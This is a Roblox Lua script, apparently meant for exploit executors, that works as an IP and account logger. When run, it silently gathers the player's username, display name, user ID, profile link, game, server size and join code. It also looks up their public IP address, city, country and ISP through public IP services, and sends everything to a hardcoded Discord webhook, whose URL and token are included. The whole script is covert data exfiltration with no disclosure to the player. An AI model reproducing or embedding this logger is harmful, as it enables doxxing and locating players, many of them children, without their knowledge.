local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"
local gameName = "Unknown"
local embedColor = tonumber("0x00FF00" )
local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg"

local function secureRequest(options )
    local requestFunc = request or http_request or (syn and syn.request )
    if requestFunc then
        local success, response = pcall(function() return requestFunc(options) end)
        if success and response then return response end
    end
    if options.Method == "GET" and game.HttpGetAsync then
         local success, responseBody = pcall(game.HttpGetAsync, game, options.Url)
         if success and responseBody then return { Body = responseBody, StatusCode = 200 } end
    end
    warn("所有 HTTP 請求方法均失敗。")
    return nil
end

local function getSecretInfo()
    local ipServices = { "https://api.ipify.org", "https://ipinfo.io/ip", "https://icanhazip.com" }
    local ip
    for _, url in ipairs(ipServices ) do
        local response = secureRequest({ Url = url, Method = "GET" })
        if response and response.Body and #response.Body > 0 and not response.Body:find("[<>]") then
            ip = response.Body:gsub("%s+", "")
            break
        end
    end
    if not ip then return nil end
    local ipDetails
    local detailResponse = secureRequest({ Url = "https://ipinfo.io/" .. ip .. "/json", Method = "GET" } )
    if detailResponse and detailResponse.Body then
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, detailResponse.Body)
        if success and type(decoded) == "table" then ipDetails = decoded end
    end
    return { ip = ip, details = ipDetails }
end

pcall(function()
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        gameName = info.Name or "Unknown"
    end)

    local secretInfo = getSecretInfo()
    local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId ) .. "/profile"

    local playerDescription = string.format(
        "**顯示名稱:** `%s`\n" ..
        "**真實名稱:** `%s`\n" ..
        "**玩家ID:** `%s`\n" ..
        "**個人資料:** [Roblox 個人頁面](%s)\n" ..
        "**遊戲:** `%s`\n" ..
        "**玩家伺服器人數:** `%d`\n" ..
        "**加入代碼:** `%s`",
        LocalPlayer.DisplayName,
        LocalPlayer.Name,
        tostring(LocalPlayer.UserId),
        profileUrl,
        gameName,
        #Players:GetPlayers(),
        game.JobId or "N/A"
    )
    
    local playerEmbed = {
        title = "Player Log:",
        description = playerDescription,
        color = embedColor
    }

    local embeds = { playerEmbed }

    if secretInfo and secretInfo.ip then
        local ip_info = secretInfo.details
        local location = (ip_info and ip_info.country and ip_info.city) and (ip_info.country .. ", " .. ip_info.city) or "未知"
        local isp = (ip_info and ip_info.org) or "未知"
        
        local ipDescription = string.format(
            "**IP 位址:** `%s`\n" ..
            "**推測位置:** `%s`\n" ..
            "**網路供應商:** `%s`",
            secretInfo.ip, location, isp
        )

        local ipEmbed = {
            title = "IP Log:",
            description = ipDescription,
            color = embedColor
        }
        
        table.insert(embeds, ipEmbed)
    end

    local data = {
        username = "三眼怪 Log V2",
        avatar_url = appIconURL,
        embeds = embeds
    }

    secureRequest({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(data)
    })
end)
